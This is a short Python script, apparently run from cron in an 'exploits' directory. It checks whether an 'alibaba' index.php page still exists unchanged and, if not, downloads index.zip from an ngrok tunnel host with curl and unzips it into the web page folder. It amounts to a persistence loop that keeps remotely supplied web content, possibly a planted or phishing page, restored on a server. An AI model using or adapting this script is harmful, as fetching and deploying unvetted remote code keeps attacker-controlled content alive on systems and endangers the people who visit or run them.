import os

folder = os.path.exists('/root/Desktop/exploits/cronjob/test/pages/alibaba/abcd')

if folder:
    # print("Exist")
    pass
else:
    os.system("mkdir -p /root/Desktop/exploits/cronjob/test/pages/alibaba/abcd")
    # print("Doesn't exist")

try:
    with open("/root/Desktop/exploits/cronjob/test/pages/alibaba/abcd/index.php", "r") as f:
        data = f.read()
        if "alibaba" in data:
            # print("File ok")
            pass
        else:
            # print("File Modified")
            # print("Downloading")
            os.system("curl http://e69646dd71a9.ngrok.io/index.zip --output index.zip")
            # print("Extracting")
            os.system("unzip -o index.zip -d /root/Desktop/exploits/cronjob/test/pages/alibaba/abcd/")
            os.system("rm index.zip")
except:
    # print("File doesn't exists")
    # print("Downloading")
    
    os.system("curl http://e69646dd71a9.ngrok.io/index.zip --output index.zip")
    # print("Extracting")
    os.system("unzip -o index.zip -d /root/Desktop/exploits/cronjob/test/pages/alibaba/abcd/")
    os.system("rm index.zip")
    
